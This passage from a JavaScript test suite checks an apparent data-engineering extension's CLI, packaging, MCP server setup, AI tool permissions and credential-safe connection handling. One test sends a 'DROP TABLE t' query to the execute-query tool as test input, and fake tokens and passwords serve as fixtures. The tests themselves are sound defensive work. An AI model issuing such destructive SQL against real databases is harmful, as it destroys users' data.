      nodeFs.writeFileSync(nodePath.join(f.ws, 'broken.yaml'), 'id: p\nentities: 5\n');
      assert.strictEqual((await cli(['validate', nodePath.join(f.ws, 'broken.yaml'), ...W])).code, 1);
      assert.strictEqual((await cli(['validate', ...W])).code, 0);
      // doctor: machine-readable, no connections configured is fine.
      const doc = await cli(['doctor', ...W, '--json'], { env: {} });
      assert.strictEqual(doc.code, 0, doc.out);
      assert.deepStrictEqual([doc.json().hasAutode, doc.json().connections, doc.json().configErrors], [true, [], []]);
      const v = await cli(['--version']);
      assert.deepStrictEqual([v.code, v.out], [0, require('../package.json').version]);
    } finally { await client.close(); f.done(); nodeFs.rmSync(out, { recursive: true, force: true }); }
  });

  await test('v0.42.0: autode conformance and probe run on the pack\'s samples, report failures (exit 1) and record nothing', async () => {
    const fs = require('node:fs'); const p = require('node:path');
    const env = await k2.cfm();
    try {
      const big = require('../dist/engine/context/fileIngestion.js').parseFile(c4a.read('sources/crm.ddl'), 'crm.ddl', { system: 'crm', environment: 'prod' });
      await env.cfm.ingestParsed(big.nodes, big.edges);
      fs.mkdirSync(p.join(env.dir, 'docs'), { recursive: true });
      fs.writeFileSync(p.join(env.dir, 'docs', 'contract.yaml'), c4a.read('documents/pack/customer-contract.v1.yaml'));
      fs.writeFileSync(p.join(env.dir, 'docs', 'crm.csv'), c4a.read('sources/samples/crm_customers.csv'));
      const { BusinessPackManager } = require('../dist/context/BusinessPackManager.js');
      const pm = new BusinessPackManager(p.join(env.dir, '.autode', 'problems', 'x', 'pack'), env.dir, () => env.cfm, () => {}, async () => ({ ...c4a.profile(), id: 'house-contract' }));
      await pm.load();
      const doc = await pm.addDocument({ path: 'docs/contract.yaml', role: 'contract', authority: 'signed', version: '1' });
      const first = await pm.applyDocument(doc.id);
      fs.writeFileSync(first.profilePath, fs.readFileSync(first.profilePath, 'utf8').replace('status: proposed', 'status: confirmed'));
      await pm.load();
      assert.strictEqual((await pm.applyDocument(doc.id)).status, 'applied');
      await pm.addDocument({ path: 'docs/crm.csv', role: 'sample', authority: 'signed', version: '1', table: 'obj:crm/prod/crm.customers' });
      await env.cfm.getLedger().assert({ kind: 'key', subject: ['obj:crm/prod/crm.customers'], predicate: 'primary', value: ['cust_no'], statement: 'cust_no is the key of crm.customers', evidence: [{ type: 'chat_message', ref: 't1' }], status: 'active', trust: 'confirmed' });
      await env.cfm.persistCompiledGraph();
      const W = ['--workspace', env.dir, '--problem', 'x'];
      const panel = await pm.conformance(pm.probeExecutor());
      const before = treeState(p.join(env.dir, '.autode'));
      const conf = await cli(['conformance', ...W, '--json']);
      assert.strictEqual(conf.code, 1, conf.out + conf.err);
      assert.deepStrictEqual(conf.json().reports.map((r) => r.tables.map((t) => t.results.map((x) => x.status))), panel.reports.map((r) => r.tables.map((t) => t.results.map((x) => x.status))), 'the panel and the CLI report the same');
      const probe = await cli(['probe', ...W]);
      assert.strictEqual(probe.code, 1, probe.out + probe.err);
      assert.ok(/✗ cust_no is the key of crm\.customers/.test(probe.out) && /sample data/.test(probe.out) && /Nothing was recorded/.test(probe.out), probe.out);
      assert.strictEqual(treeState(p.join(env.dir, '.autode')), before, 'conformance and probe write nothing');
      assert.strictEqual((await cli(['probe', '--workspace', env.dir, '--problem', 'x', '--connection', 'snowflake:nope'])).code, 5, 'an unknown connection is not found');
    } finally { env.cleanup(); }
  });

  await test('v0.42.0: the autode package — packs to a tarball with no vscode reference, within budget; autode mcp from it answers like dist/mcp-server.js', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const { Client } = require('@modelcontextprotocol/sdk/client/index.js');
    const { StdioClientTransport } = require('@modelcontextprotocol/sdk/client/stdio.js');
    const { stage, pack } = fresh('../scripts/pack-cli.cjs');
    const tmp = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-pkg-'));
    const f = await mcpWorkspace();
    const clients = [];
    try {
      const dir = stage(nodePath.join(tmp, 'package'));
      const pkg = JSON.parse(nodeFs.readFileSync(nodePath.join(dir, 'package.json'), 'utf8'));
      assert.deepStrictEqual([pkg.name, pkg.version, pkg.bin.autode, pkg.dependencies], ['autode', require('../package.json').version, 'dist/autode.js', undefined], 'no runtime dependency');
      const packed = pack(dir, tmp);
      assert.ok(nodeFs.existsSync(packed.tarball));
      assert.ok(packed.size < 600 * 1024, `tarball ${Math.round(packed.size / 1024)} KB (budget 600 KB)`);
      // The development build is not minified (the published one is, at well under half): this budget guards growth, not the shipped size.
      assert.ok(packed.unpackedSize < 2.5 * 1024 * 1024, `unpacked ${Math.round(packed.unpackedSize / 1024)} KB (budget 2.5 MB)`);
      for (const want of ['package.json', 'README.md', 'LICENSE', 'dist/autode.js', 'dist/mcp-server.js', 'dist/THIRD-PARTY-NOTICES.md', 'media/autode-icon-64.png', 'skills/autode-de-interview-requirements/SKILL.md']) assert.ok(packed.files.includes(want), `missing ${want}`);
      for (const rel of packed.files) {
        const text = nodeFs.readFileSync(nodePath.join(dir, rel), 'utf8');
        assert.ok(!/require\(["']vscode["']\)|from ["']vscode["']/.test(text), `${rel} references vscode`);
      }
      assert.ok(!/\]\((?!https?:|#)/.test(nodeFs.readFileSync(nodePath.join(dir, 'README.md'), 'utf8')), 'README links are absolute');
      // The MCP contract: autode mcp from the package and the extension's mcp-server.js answer the same.
      const connect = async (args) => {
        const c = new Client({ name: 'autode-tests', version: '1' });
        await c.connect(new StdioClientTransport({ command: process.execPath, args: [...args, '--workspace', f.ws], stderr: 'pipe' }));
        clients.push(c);
        return c;
      };
      const pkgClient = await connect([nodePath.join(dir, 'dist', 'autode.js'), 'mcp']);
      const extClient = await connect([nodePath.join(__dirname, '..', 'dist', 'mcp-server.js')]);
      assert.deepStrictEqual(pkgClient.getServerVersion().version, extClient.getServerVersion().version);
      assert.deepStrictEqual((await pkgClient.listTools()).tools, (await extClient.listTools()).tools);
      assert.deepStrictEqual((await pkgClient.listPrompts()).prompts, (await extClient.listPrompts()).prompts, 'the package finds its bundled interview prompts');
      assert.deepStrictEqual((await pkgClient.listResources()).resources, (await extClient.listResources()).resources);
      for (const [name, args] of [['autode_compile_pipeline_spec', { dialect: 'spark_sql' }], ['autode_search_primitives', {}], ['autode_resolve', { text: 'customer email' }], ['autode_list_decisions', {}], ['autode_execute_query', { connectionId: 'x', sql: 'DROP TABLE t' }]]) {
        assert.deepStrictEqual((await pkgClient.callTool({ name, arguments: args })).structuredContent, (await extClient.callTool({ name, arguments: args })).structuredContent, name);
      }
    } finally { for (const c of clients) await c.close(); f.done(); nodeFs.rmSync(tmp, { recursive: true, force: true }); }
  });

  await test('v0.42.0: Configure MCP for Claude Code prefers the installed autode, keeps other servers, and flags an entry left behind by an update', () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const M = fresh('../dist/core/mcpConfig.js');
    const bin = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-bin-'));
    try {
      const ext = nodePath.join(os.homedir(), '.vscode', 'extensions', 'arun-gribta.auto-data-engineering-hub-0.42.0');
      // Nothing on PATH: VS Code's runtime runs the extension's bundle.
      // PATH lists are split the platform's way, so this runs on the native platform.
      const win = process.platform === 'win32';
      const env = { PATH: bin, PATHEXT: '.EXE;.CMD' };
      let c = M.chooseMcpEntry({ extensionPath: ext, env, execPath: '/opt/code/code' });
      assert.deepStrictEqual([c.source, c.entry.command, c.entry.args, c.entry.env], ['extension', '/opt/code/code', [nodePath.join(ext, 'dist', 'autode.js'), 'mcp', '--workspace', '.'], { ELECTRON_RUN_AS_NODE: '1' }]);
      nodeFs.writeFileSync(nodePath.join(bin, win ? 'node.EXE' : 'node'), '');
      c = M.chooseMcpEntry({ extensionPath: ext, env });
      assert.deepStrictEqual([c.source, c.entry.command], ['extension', 'node']);
      nodeFs.writeFileSync(nodePath.join(bin, win ? 'autode.CMD' : 'autode'), '');
      c = M.chooseMcpEntry({ extensionPath: ext, env });
      // npm's .cmd shims need cmd /c on Windows.
      assert.deepStrictEqual([c.source, c.entry], ['installed', win ? { command: 'cmd', args: ['/c', 'autode', 'mcp', '--workspace', '.'] } : { command: 'autode', args: ['mcp', '--workspace', '.'] }]);
      // Merge keeps everything else; a repeat is no change; bad JSON is refused.
      const existing = JSON.stringify({ mcpServers: { other: { command: 'x' } }, extra: true });
      const m = M.mergeMcpJson(existing, c.entry);
      assert.deepStrictEqual(JSON.parse(m.text), { mcpServers: { other: { command: 'x' }, autode: c.entry }, extra: true });
      assert.strictEqual(M.mergeMcpJson(m.text, c.entry).changed, false);
      assert.throws(() => M.mergeMcpJson('[1]', c.entry), /not a JSON object/);
      // An entry pointing into an older extension folder is stale; this one's own, or an installed autode, is not.
      const old = { command: 'node', args: [nodePath.join(os.homedir(), '.vscode', 'extensions', 'arun-gribta.auto-data-engineering-hub-0.41.0', 'dist', 'mcp-server.js'), '--workspace', '.'] };
      assert.strictEqual(M.isStaleExtensionEntry(old, ext), true);
      assert.strictEqual(M.isStaleExtensionEntry({ command: 'node', args: [nodePath.join(ext, 'dist', 'autode.js'), 'mcp'] }, ext), false);
      assert.strictEqual(M.isStaleExtensionEntry({ command: 'autode', args: ['mcp'] }, ext), false);
      const pkg = require('../package.json');
      assert.ok(pkg.contributes.commands.some((x) => x.command === 'autoDataEngineeringHub.configureMcpClaudeCode'));
    } finally { nodeFs.rmSync(bin, { recursive: true, force: true }); }
  });

  await test('v0.42.0: the VSIX ships the CLI bundle and the mcp-server.js shim; the shim is the same server', () => {
    const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const ignore = nodeFs.readFileSync(nodePath.join(__dirname, '..', '.vscodeignore'), 'utf8');
    for (const f of ['!dist/autode.js', '!dist/mcp-server.js', '!dist/extension.js']) assert.ok(ignore.includes(f), f);
    const shim = nodeFs.readFileSync(nodePath.join(__dirname, '..', 'dist', 'mcp-server.js'), 'utf8');
    assert.ok(shim.length < 1024 && /require\('\.\/autode\.js'\)\.main\(\['mcp'/.test(shim), shim);
    const bundle = nodeFs.readFileSync(nodePath.join(__dirname, '..', 'dist', 'autode.js'), 'utf8');
    assert.ok(bundle.startsWith('#!/usr/bin/env node'));
  });

  // ── v0.43.0: phase 5 — the extension as an MCP client; exposure to other agents ──

  await test('v0.43.0: EngineClient — the engine\'s MCP tools in-process, started on first use; a skill run gets read-only tools, proposals only in full mode, never a destructive tool', async () => {
    const nodePath = require('node:path');
    const { EngineClient, selectEngineTools, declaredEngineTools, EngineError } = fresh('../dist/core/engineClient.js');
    const f = await mcpWorkspace();
    const engine = new EngineClient({ workspaceRoot: f.ws, resourcesRoot: nodePath.join(__dirname, '..'), version: 't', log: () => {} });
    try {
      assert.strictEqual(engine.pending, undefined, 'constructing the client starts nothing');
      const tools = await engine.listTools();
      const external = await mcpSession(f.ws);
      try { assert.deepStrictEqual(tools.map((t) => t.name), (await external.listTools()).tools.map((t) => t.name), 'the same tools as autode mcp'); } finally { await external.close(); }
      const ro = selectEngineTools(tools, 'read-only', undefined).map((t) => t.name);
      const full = selectEngineTools(tools, 'full', undefined).map((t) => t.name);
      assert.ok(ro.includes('autode_compile_transform') && ro.includes('autode_check_grounding') && !ro.some((n) => /^autode_propose_/.test(n)), ro.join());
      assert.ok(full.includes('autode_propose_vocabulary') && !full.includes('autode_resolve_decision') && !full.includes('autode_apply_decision'), 'proposals in full mode; resolving or applying a decision never');
      assert.deepStrictEqual(selectEngineTools(tools, 'none', undefined), []);
      assert.deepStrictEqual([...declaredEngineTools(['Read', 'autode_resolve', 'mcp__autode__autode_compile_transform', 'mcp__other__x'], tools.map((t) => t.name))].sort(), ['autode_compile_transform', 'autode_resolve']);
      assert.strictEqual(declaredEngineTools(['mcp__autode__*'], tools.map((t) => t.name)).size, tools.length);
      assert.strictEqual(await engine.declaresWrite(['Read', 'mcp__autode__autode_compile_transform']), false);
      assert.strictEqual(await engine.declaresWrite(['mcp__autode__autode_propose_vocabulary']), true);
      assert.strictEqual(await engine.declaresWrite(['mcp__autode__autode_resolve_decision']), false, 'a destructive tool is never granted, so it raises nothing');
      // A run's tool set: the model sees the tool's JSON; anything outside the selection is refused.
      const set = await engine.toolSet('read-only', ['mcp__autode__autode_search_primitives', 'mcp__autode__autode_compile_pipeline_spec']);
      assert.deepStrictEqual(set.specs.map((s) => s.name).sort(), ['autode_compile_pipeline_spec', 'autode_search_primitives']);
      const ok = await set.call('autode_compile_pipeline_spec', { dialect: 'snowflake' });
      assert.ok(!ok.isError && JSON.parse(ok.text).entities.length > 0, ok.text);
      const bad = await set.call('autode_compile_pipeline_spec', { dialect: 'cobol' });
      assert.ok(bad.isError && /VALIDATION_FAILED/.test(bad.text));
      assert.ok((await set.call('autode_propose_vocabulary', { mapping: {} })).isError, 'not in this run');
      await assert.rejects(engine.call('autode_describe_primitive', { kind: 'nope' }), (e) => e instanceof EngineError && e.code === 'UNKNOWN_PRIMITIVE');
      // Disposed (or gone), the next call starts it again.
      await engine.dispose();
      assert.strictEqual(engine.pending, undefined);
      assert.ok((await engine.call('autode_search_primitives', {})).items.length > 0, 'recovers on the next call');
    } finally { await engine.dispose(); f.done(); }
  });

  await test('v0.43.0: every AutoDE tool loop offers the run\'s engine tools next to the file tools and routes their calls to the engine, audited', async () => {
    const mock = createMock();
    const T = withMock(mock, () => fresh('../dist/core/agenticTools.js'));
    const calls = [];
    const engine = { specs: [{ name: 'autode_resolve', description: 'Resolve', parameters: { type: 'object', additionalProperties: false, required: ['text'], properties: { text: { type: 'string', minLength: 1 }, limit: { type: 'integer', minimum: 1 } } } }], call: async (name, input) => { calls.push([name, input]); return { text: '{"matches":[]}', isError: false }; } };
    assert.deepStrictEqual(T.toolSpecsForMode('read-only', ['autode_read_file'], engine).map((s) => s.name), ['autode_read_file', 'autode_resolve']);
    assert.deepStrictEqual(T.toolSpecsForMode('none', undefined, engine), [], 'no tools in none mode, engine tools included');
    assert.deepStrictEqual(T.toolSpecsForMode('read-only', undefined).map((s) => s.name), ['autode_read_file', 'autode_list_dir', 'autode_search_files'], 'without an engine set: unchanged');
    const audit = [];
    const offered = new Set(['autode_resolve']);
    const out = await withMock(mock, () => T.executeAgenticTool({ id: '1', name: 'autode_resolve', input: { text: 'orders' } }, '/ws', audit, offered, engine));
    assert.strictEqual(out, '{"matches":[]}');
    assert.deepStrictEqual(calls, [['autode_resolve', { text: 'orders' }]]);
    assert.deepStrictEqual(audit.map((a) => [a.tool, a.outcome]), [['autode_resolve', 'ok']]);
    const denied = await withMock(mock, () => T.executeAgenticTool({ id: '2', name: 'autode_propose_vocabulary', input: {} }, '/ws', audit, offered, engine));
    assert.ok(/not available/.test(denied) && audit[1].outcome === 'denied');
    // Gemini takes an OpenAPI subset of JSON Schema.
    assert.deepStrictEqual(T.geminiSchema(engine.specs[0].parameters), { type: 'object', properties: { text: { type: 'string' }, limit: { type: 'integer' } }, required: ['text'] });
  });

  await test('v0.43.0: ToolSkillAgent offers engine tools by the skill\'s allowed-tools and trust — a declared proposal raises a trusted skill to full; a reviewed skill gets read-only; Claude Code gets none', async () => {
    const os = require('node:os'); const nodePath = require('node:path'); const nodeFs = require('node:fs');
    const L = fresh('../dist/engine/skills/lifecycle.js');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-skill-eng-'));
    const mk = (id, md, tier) => { const d = nodePath.join(ws, '.autode', 'config', 'skills', 'tool-skills', id); nodeFs.mkdirSync(d, { recursive: true }); nodeFs.writeFileSync(nodePath.join(d, 'SKILL.md'), md); L.recordImport(d, { source: 'local' }, 't'); L.setTrustTier(d, tier, 't'); };
    mk('mapper', '---\nname: mapper\nallowed-tools: [Read, mcp__autode__autode_resolve, mcp__autode__autode_propose_vocabulary]\n---\nPropose a mapping.\n', 'trusted');
    mk('peek', '---\nname: peek\nallowed-tools: [Read, mcp__autode__autode_resolve, mcp__autode__autode_propose_vocabulary]\n---\nLook.\n', 'reviewed');
    try {
      const { executeToolSkillAgent } = withMock(createMock(), () => fresh('../dist/agents/build/ToolSkillAgent.js'));
      const asked = []; let disposed = 0;
      const engine = {
        declaresWrite: async (d) => d.some((x) => /propose/.test(x)),
        toolSet: async (mode, d) => { asked.push([mode, d]); return { specs: [{ name: 'autode_resolve', description: '', parameters: {} }, ...(mode === 'full' ? [{ name: 'autode_propose_vocabulary', description: '', parameters: {} }] : [])], call: async () => ({ text: '{}', isError: false }) }; },
        dispose: async () => { disposed++; }
      };
      const run = async (skillId, provider) => {
        let seen;
        const settings = { activeLlmProvider: provider, languageModelProgrammaticConsent: true };
        const result = await executeToolSkillAgent({ id: 's', assignedAgent: 'toolSkillAgent', taskDescription: 'go', status: 'running', skillId }, {
          objective: '', settings, workspaceRoot: ws, log: () => {}, configManager: { getSecret: async () => undefined, getSettings: () => settings }, engine,
          runWithTools: async (_p, o) => { seen = o; return { text: 'ok', audit: [], provider }; }
        });
        return { result, seen };
      };
      let r = await run('mapper', 'openai');
      assert.strictEqual(r.result.success, true, r.result.message);
      assert.deepStrictEqual([r.seen.toolExecutionMode, r.seen.allowedToolNames, r.seen.engineTools.specs.map((s) => s.name)], ['full', ['autode_read_file'], ['autode_resolve', 'autode_propose_vocabulary']], 'a declared proposal needs full mode; file tools stay Read only');
      assert.deepStrictEqual(r.result.details.engineTools, ['autode_resolve', 'autode_propose_vocabulary']);
      r = await run('peek', 'openai');
      assert.deepStrictEqual([r.seen.toolExecutionMode, r.seen.engineTools.specs.map((s) => s.name)], ['read-only', ['autode_resolve']], 'a reviewed skill never gets a write-capable engine tool');
      assert.deepStrictEqual(asked.map((a) => a[0]), ['full', 'read-only']);
      r = await run('mapper', 'claude');
      assert.strictEqual(r.seen.engineTools, undefined, 'Claude Code runs its own loop: no engine tools');
      assert.strictEqual(r.seen.toolExecutionMode, 'read-only', 'and so no proposal raises its mode');
      assert.strictEqual(disposed, 3, 'the engine is released after every run');
    } finally { nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  await test('v0.43.0: VS Code agent mode gets the AutoDE server from a provider — VS Code\'s runtime, no config file; VS Code-stored secrets only when it starts; older VS Code is left alone', async () => {
    const os = require('node:os'); const nodePath = require('node:path'); const nodeFs = require('node:fs');
    const M = fresh('../dist/core/mcpConfig.js');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-prov-'));
    try {
      nodeFs.mkdirSync(nodePath.join(ws, '.autode', 'config'), { recursive: true });
      nodeFs.writeFileSync(nodePath.join(ws, '.autode', 'config', 'connections.yaml'), 'connections:\n  - platform: databricks\n    ref: prod\n    workspaceUrl: https://adb-1.azuredatabricks.net\n    httpPath: /sql/1.0/warehouses/w\n    credentials: { resolver: vscode, ref: prod }\n  - platform: snowflake\n    account: ACME\n    username: me\n');
      const secretEnv = () => M.vscodeSecretEnv(ws, async (entry) => entry.platform === 'databricks' ? { token: 'tok-123', clientSecret: 'not-a-field-of-this-entry' } : undefined);
      assert.deepStrictEqual(await secretEnv(), { AUTODE_DATABRICKS_PROD_TOKEN: 'tok-123' }, 'only the entry\'s secret fields, under their stand-in names');
      // A fake VS Code with the provider API.
      let registered; const events = [];
      class Def { constructor(label, command, args, env, version) { Object.assign(this, { label, command, args, env, version }); } }
      const fakeVs = {
        lm: { registerMcpServerDefinitionProvider: (id, p) => { registered = { id, p }; return { dispose: () => events.push('unregistered') }; } },
        McpStdioServerDefinition: Def,
        EventEmitter: class { constructor() { this.event = () => ({ dispose() {} }); } fire() {} dispose() {} },
        Uri: { file: (p) => ({ fsPath: p }) },
        workspace: { onDidChangeWorkspaceFolders: () => ({ dispose() {} }) }
      };
      const ext = nodePath.join(os.tmpdir(), 'ext');
      const disposable = M.registerMcpProvider(fakeVs, { extensionPath: ext, version: '0.43.0', workspaceRoot: () => ws, secretEnv, log: () => {} });
      assert.strictEqual(registered.id, 'autode');
      const [def] = await registered.p.provideMcpServerDefinitions();
      assert.deepStrictEqual([def.label, def.command, def.args, def.env, def.version, def.cwd.fsPath], ['AutoDE', process.execPath, [nodePath.join(ext, 'dist', 'autode.js'), 'mcp', '--workspace', ws], { ELECTRON_RUN_AS_NODE: '1' }, '0.43.0', ws]);
      assert.ok(!JSON.stringify(def).includes('tok-123'), 'no secret in the listed definition');
      const resolved = await registered.p.resolveMcpServerDefinition(def);
      assert.deepStrictEqual(resolved.env, { ELECTRON_RUN_AS_NODE: '1', AUTODE_DATABRICKS_PROD_TOKEN: 'tok-123' });
      disposable.dispose();
      assert.deepStrictEqual(events, ['unregistered']);
      assert.deepStrictEqual(await (M.registerMcpProvider(fakeVs, { extensionPath: ext, version: '1', workspaceRoot: () => undefined, secretEnv, log: () => {} }), registered.p.provideMcpServerDefinitions()), [], 'no folder, no server');
      assert.strictEqual(M.registerMcpProvider({ lm: {} }, { extensionPath: ext, version: '1', workspaceRoot: () => ws, secretEnv, log: () => {} }), undefined, 'feature-detected');
      const pkg = require('../package.json');
      assert.deepStrictEqual(pkg.contributes.mcpServerDefinitionProviders, [{ id: 'autode', label: 'AutoDE' }]);
      assert.ok(pkg.activationEvents.includes('onMcpCollection:autode'));
    } finally { nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  await test('v0.43.0: the stable server copy — made by Configure MCP, refreshed after an update (never created at activation), and it runs as the same server', async () => {
    const os = require('node:os'); const nodePath = require('node:path'); const nodeFs = require('node:fs');
    const { Client } = require('@modelcontextprotocol/sdk/client/index.js');
    const { StdioClientTransport } = require('@modelcontextprotocol/sdk/client/stdio.js');
    const M = fresh('../dist/core/mcpConfig.js');
    const storage = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-store-'));
    const root = nodePath.join(__dirname, '..');
    const f = await mcpWorkspace();
    try {
      assert.deepStrictEqual(M.SERVER_FILES, require('../scripts/pack-cli.cjs').CONTENT, 'the same files as the autode package');
      assert.strictEqual(M.refreshStableServer(root, storage, '1.0.0'), false, 'activation never creates a copy');
      assert.ok(!nodeFs.existsSync(M.stableServerDir(storage)));
      const bundle = M.ensureStableServer(root, storage, '1.0.0');
      assert.strictEqual(bundle, nodePath.join(M.stableServerDir(storage), 'dist', 'autode.js'));
      assert.strictEqual(M.stableServerVersion(storage), '1.0.0');
      const stamp = nodeFs.statSync(bundle).mtimeMs;
      assert.strictEqual(M.ensureStableServer(root, storage, '1.0.0'), bundle);
      assert.strictEqual(nodeFs.statSync(bundle).mtimeMs, stamp, 'same version: not copied again');
      assert.strictEqual(M.refreshStableServer(root, storage, '1.1.0'), true, 'an update refreshes the existing copy');
      assert.strictEqual(M.stableServerVersion(storage), '1.1.0');
      const c = M.chooseMcpEntry({ extensionPath: '/ext', env: { PATH: '' }, stableBundle: bundle, execPath: '/code' });
      assert.deepStrictEqual([c.source, c.entry.args[0]], ['stable', bundle]);
      // The copy runs as the server and finds its bundled prompts (its package.json is named autode).
      const client = new Client({ name: 't', version: '1' });
      await client.connect(new StdioClientTransport({ command: process.execPath, args: [bundle, 'mcp', '--workspace', f.ws], stderr: 'pipe' }));
      try {
        assert.strictEqual(client.getServerVersion().version, '1.1.0');
        assert.ok((await client.listPrompts()).prompts.some((p) => /^autode_interview_/.test(p.name)));
      } finally { await client.close(); }
      assert.strictEqual(M.isStaleExtensionEntry({ command: 'node', args: [bundle, 'mcp'] }, '/ext'), false, 'the stable copy is never stale');
    } finally { f.done(); nodeFs.rmSync(storage, { recursive: true, force: true }); }
  });

  // ── v0.43.1: connections on every surface ──

  // A workspace, a .databrickscfg and a Snowflake connections.toml of its own, and a CLI whose platforms are fakes.
  const connHarness = (opts = {}) => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-conn-'));
    const home = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-conn-home-'));
    nodeFs.writeFileSync(nodePath.join(home, '.databrickscfg'), '[DEFAULT]\nhost = https://adb-1.azuredatabricks.net\ntoken = dapi-default\n\n[prod]\nhost = https://adb-2.azuredatabricks.net\ntoken = dapi-prod\n');
    nodeFs.mkdirSync(nodePath.join(home, 'sf'));
    nodeFs.writeFileSync(nodePath.join(home, 'sf', 'connections.toml'), '[dev]\naccount = "ACME-DEV"\nuser = "me"\n');
    const saved = { DATABRICKS_CONFIG_FILE: process.env.DATABRICKS_CONFIG_FILE, SNOWFLAKE_HOME: process.env.SNOWFLAKE_HOME };
    process.env.DATABRICKS_CONFIG_FILE = nodePath.join(home, '.databrickscfg');
    process.env.SNOWFLAKE_HOME = nodePath.join(home, 'sf');
    const connected = [];
    const { PlatformSession } = fresh('../dist/mcp/platform.js');
    const { ConnectionManager } = fresh('../dist/engine/platform/ConnectionManager.js');
    const fake = (platform) => (creds) => ({
      async connect() { if (opts.fail) throw new Error(opts.fail); connected.push({ platform, creds }); return { connected: true, platform, databaseName: 'D', schemaName: 'S', version: '1', capabilities: {} }; },
      async disconnect() {}, dispose() {}, getConnectionId: () => `${platform}:x`, getCapabilities: () => ({}),
      async executeQuery() { return { columns: [], rows: [], rowCount: 0, executionTimeMs: 0 }; }
    });
    const platform = (o) => new PlatformSession({ ...o, allowWrite: false, log: () => {}, createManager: (log, options) => { const m = new ConnectionManager(log, options); for (const p of ['snowflake', 'databricks', 'oracle']) m.registerAdapterFactory(p, fake(p)); return m; } });
    return {
      ws, connected, platform,
      file: (...p) => nodePath.join(ws, ...p),
      read: (...p) => nodeFs.readFileSync(nodePath.join(ws, ...p), 'utf8'),
      exists: (...p) => nodeFs.existsSync(nodePath.join(ws, ...p)),
      done: () => { for (const [k, v] of Object.entries(saved)) { if (v === undefined) delete process.env[k]; else process.env[k] = v; } nodeFs.rmSync(ws, { recursive: true, force: true }); nodeFs.rmSync(home, { recursive: true, force: true }); }
    };
  };

  await test('v0.43.1: autode connections add — picks an existing Databricks profile, asks only for what is missing, tests before saving, and records readiness; the token never reaches a file', async () => {
    const h = connHarness();
    try {
      const W = ['--workspace', h.ws];
      // Answers: platform, role (default), profile 2 = prod, HTTP path, catalog, schema, confirm.
      const r = await cli(['connections', 'add', ...W], { interactive: true, platform: h.platform, answers: ['databricks', '', '2', '/sql/1.0/warehouses/abc', 'main', '', 'save'] });
      assert.strictEqual(r.code, 0, r.out + r.err);
      assert.ok(/1\. DEFAULT — profile, https:\/\/adb-1/.test(r.out) && /2\. prod/.test(r.out), r.out);
      assert.ok(/Testing the connection/.test(r.out) && /✓ Connected/.test(r.out));
      assert.strictEqual(h.connected.length, 1);
      assert.deepStrictEqual([h.connected[0].creds.profile, h.connected[0].creds.token], ['prod', undefined], 'a pointer to the profile; the adapter reads the token itself');
      const team = h.read('.autode', 'config', 'connections.yaml');
      assert.ok(/platform: databricks/.test(team) && /httpPath: \/sql\/1.0\/warehouses\/abc/.test(team) && /catalog: main/.test(team) && /resolver: cli, ref: prod/.test(team), team);
      assert.ok(!/dapi/.test(team), 'no token in the file');
      const list = await cli(['connections', 'list', ...W, '--json']);
      const row = list.json().connections[0];
      assert.deepStrictEqual([row.id, row.status.autode], ['databricks:prod', 'ready']);
      assert.ok(/profile \[prod\]/.test(row.needs.summary), row.needs.summary);
      // A failing test saves nothing.
      const bad = connHarness({ fail: 'Invalid access token' });
      try {
        const b = await cli(['connections', 'add', '--workspace', bad.ws, '--platform', 'databricks', '--role', 'source', '--resolver', 'cli', '--ref', 'DEFAULT', '--set', 'httpPath=/sql/1.0/warehouses/x'], { interactive: true, platform: bad.platform, answers: ['', '', 'save'] });
        assert.strictEqual(b.code, 6, b.out + b.err);
        assert.ok(/Invalid access token/.test(b.err) && /Nothing was saved/.test(b.err));
        assert.ok(!bad.exists('.autode', 'config', 'connections.yaml'));
      } finally { bad.done(); }
    } finally { h.done(); }
  });

  await test('v0.43.1: autode connections add with environment variables — personal fields to the local file, untested save, list names the variables still to set; refusals and bad input', async () => {
    const h = connHarness();
    try {
      const W = ['--workspace', h.ws];
      const flags = ['--platform', 'snowflake', '--role', 'target', '--resolver', 'env', '--ref', 'prod', '--set', 'account=ACME-XY1', '--set', 'username=JDOE', '--set', 'database=ANALYTICS', '--no-test'];
      // Remaining prompts: authMode, keyPath, warehouse, schema, snowflakeRole — all left blank; then confirm.
      const r = await cli(['connections', 'add', ...W, ...flags], { interactive: true, platform: h.platform, answers: ['', '', 'WH', '', '', 'save'] });
      assert.strictEqual(r.code, 0, r.out + r.err);
      assert.ok(/AUTODE_SNOWFLAKE_PROD_PRIVATE_KEY_PASSPHRASE/.test(r.out) && /only if the private key is encrypted/.test(r.out), r.out);
      assert.ok(/Saved untested/.test(r.out));
      assert.strictEqual(h.connected.length, 0, '--no-test connects to nothing');
      const team = h.read('.autode', 'config', 'connections.yaml');
      assert.ok(/account: ACME-XY1/.test(team) && /warehouse: WH/.test(team) && !/JDOE/.test(team), 'the username is personal');
      assert.ok(/JDOE/.test(h.read('.autode', 'local', 'connections.yaml')));
      const list = (await cli(['connections', 'list', ...W, '--json'], { env: {} })).json();
      assert.deepStrictEqual([list.connections[0].id, list.connections[0].status.autode, list.connections[0].needs.variables.map((v) => [v.name, v.set])], ['snowflake:ACME-XY1', 'unchecked', [['AUTODE_SNOWFLAKE_PROD_PRIVATE_KEY_PASSPHRASE', false]]]);
      // A secret is refused before anything is asked about saving.
      const s = await cli(['connections', 'add', ...W, ...flags, '--set', 'password=hunter2'], { interactive: true, platform: h.platform, answers: ['', '', '', '', ''] });
      assert.strictEqual(s.code, 1);
      assert.ok(/can't be written to a connections file/.test(s.out) && !/hunter2/.test(h.read('.autode', 'config', 'connections.yaml')));
      // A person, in a terminal.
      assert.strictEqual((await cli(['connections', 'add', ...W, ...flags], { interactive: false })).code, 4);
      assert.strictEqual((await cli(['connections', 'add', ...W, ...flags], { interactive: true, env: { CI: 'true' } })).code, 4);
